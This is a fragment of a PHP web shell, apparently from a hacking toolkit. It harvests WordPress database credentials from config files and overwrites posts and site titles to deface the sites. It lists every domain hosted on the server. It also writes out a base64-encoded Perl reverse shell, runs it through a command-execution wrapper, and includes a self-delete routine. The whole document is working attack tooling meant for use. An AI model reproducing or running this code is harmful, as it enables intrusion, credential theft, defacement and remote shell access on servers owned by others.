							$title = htmlspecialchars($_POST['new_title']);
							$pn_title = str_replace(" ", "-", $title);
							$script = $title;
							$conf = $_POST['config_dir'];
							$scan_conf = scandir($conf);
						foreach($scan_conf as $file_conf) {
							if(!is_file("$conf/$file_conf")) continue;
							$config = file_get_contents("$conf/$file_conf");
							if(preg_match("/WordPress/", $config)) {
								$dbhost = ambilkata($config,"DB_HOST', '","'");
								$dbuser = ambilkata($config,"DB_USER', '","'");
								$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
								$dbname = ambilkata($config,"DB_NAME', '","'");
								$dbprefix = ambilkata($config,"table_prefix  = '","'");
								$prefix = $dbprefix."posts";
								$option = $dbprefix."options";
								$conn = mysql_connect($dbhost,$dbuser,$dbpass);
								$db = mysql_select_db($dbname);
								$q = mysql_query("SELECT * FROM $prefix ORDER BY ID ASC");
								$result = mysql_fetch_array($q);
								$id = $result[ID];
								$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
								$result2 = mysql_fetch_array($q2);
								$target = $result2[option_value];
								$update = mysql_query("UPDATE $prefix SET post_title='$title',post_content='$script',post_name='$pn_title',post_status='publish',comment_status='open',ping_status='open',post_type='post',comment_count='1' WHERE id='$id'");
								$update .= mysql_query("UPDATE $option SET option_value='$title' WHERE option_name='blogname' OR option_name='blogdescription'");
								echo "<div style='margin: 5px auto;'>";
								if($target == '') {
									echo "<font color=red>There Was a Error While Doing The Task</font>";
								} else {
									echo "<a href='$target/".$pn_title."' target='_blank'><font color='lawngreen'>$target/$pn_title</font></a>";
								}
								if(!$update OR !$conn OR !$db) {
									echo "<font color=red>MySQL Error: ".mysql_error()."</font><br>";
								} else {
									echo "<font color=lime></font><br>";
								}
								echo "</div>";
								mysql_close($conn);
						}
					} 
				}
			}
		?>
		<font style="color: white; font-family: cursive; font-size: 100%;">
		<?php
			if (isset($_GET['domains'])) { 
				if(strtolower(substr(PHP_OS,0,3)) == "win") {
					$os = 'win';
					}	else {
							$os = 'nix';
					} 

					if ($os == 'win') {
					?>
				<center><br><br>
					<font style="color: white; font-family: cursive; font-size: 200%;">Ooopppss Windows Server :P<br>You Better Find Linux :P </font>
				</center><?php
			}
			else {
				$file = @implode(@file("/etc/named.conf"));
				$Domain_path = "/var/named";
				if (!$file) {
				$domains = scandir($Domain_path);
				$count=1;
				$dc = 0;
				 echo "<table align=center border=1 width=59% cellpadding=5>
				<tr><td colspan=2><center>There are : ( <b>" . count($domains) . "</b> ) Domains in this Sever.</center></td></tr>
				<tr><td>No</td><td>Domains</td><td>User</td></tr>";
				foreach ($domains as &$domain) {
				    if (stripos($domain,".db")) {
				    $domain = str_replace('.db','',$domain);

				    }
				    if (strlen($domain) > 6) {
				        
				        echo "<tr><td><a href='http://".$domain."' target='_blank'>".'http://'.$domain.'/index.php'."</a></td><td></td></tr>";
				    }
				} 
				    echo "</table>";
				} else{
				$count = 1;
				preg_match_all("#named/(.*?).db#", $file, $r);
				$domains = array_unique($r[1]);
				echo "<table align=center border=1 width=59% cellpadding=5>
				<tr><td colspan=2> There are  ( <b>" . count($domains) . "</b> ) Domains in this Sever.I think you have got something this time yeah!!!.</td></tr>
				<tr><td>Domains";
				foreach ($domains as $domain) {
				$user = posix_getpwuid(@fileowner("/etc/valiases/" . $domain));
				echo "<tr><td><a href='http://".$domain."' target='_blank'>".'http://'.$domain.'/index.php'."</a></td><td></td></tr>";
	    				}
					} 
				} 					
			}
		?>
		<?php
			if (isset($_GET['back_connecter'])) {
				$back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
				echo "<center><br><br><form name='nfp' onSubmit=\"g(null,null,'bcp',this.server.value,this.port.value);return false;\" method='POST'><span style='font-family: cursive; font-size: 200%; color: white;'>Back-Connecter Via Perl</span><br/><br>Your Ip: <input type='text' name='server' value='". $_SERVER['REMOTE_ADDR'] ."'><br><br> Port to bind: <input type='text' name='port' value='110'><br><br><input type=submit name='backconnect' value='Submit'></form><br>";			
				if(isset($_POST['backconnect'])) {
					function cf($f,$t) {
						$w = @fopen($f,"w") or @function_exists('file_put_contents');
						if($w){
							@fwrite($w,@base64_decode($t));
							@fclose($w);
					}
				}
				function An0n3xPloiTeR($in) {
					$out = '';
					if (function_exists('exec')) {
						@exec($in,$out);
						$out = @join("\n",$out);
					} elseif (function_exists('passthru')) {
						ob_start();
						@passthru($in);
						$out = ob_get_clean();
					} elseif (function_exists('system')) {
						ob_start();
						@system($in);
						$out = ob_get_clean();
					} elseif (function_exists('shell_exec')) {
						$out = shell_exec($in);
					} elseif (is_resource($f = @popen($in,"r"))) {
						$out = "";
						while(!@feof($f))
							$out .= fread($f,1024);
						pclose($f);
					}
					return $out;
				}

				if($_POST['backconnect']) {
					cf("/tmp/bc.pl",$back_connect_p);
					$out = An0n3xPloiTeR("perl /tmp/bc.pl ".$_POST['server']." ".$_POST['port']." 1>/dev/null 2>&1 &");
            		sleep(1);
					echo "<pre class=ml1>$out\n".An0n3xPloiTeR("ps aux | grep bc.pl")."</pre>";
            		unlink("/tmp/bc.pl");
					}
				}
			}	
		?>
		<?php
			if (isset($_GET['die'])) {
				?>
					<form action="" method="POST"><center><br><br>
						<font style="color: red; font-family: cursive; font-size: 200%;">You Sure ?</font><br><br><input type="submit" name="fuckoff" value="Yes" />
					</form>
				<?php

				if (isset($_POST['fuckoff'])) {
					if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__))) {
						die('<font style="color: red; font-family: cursive; font-size: 200%;"><br><br>You <span style="color: teal;">Deleted</span> Me :3 <br> Now <span style="color: lawngreen;">Fuck </span>Off :V<br>');}
				}
			}
		?>	
		</div>
	</body>
</html>
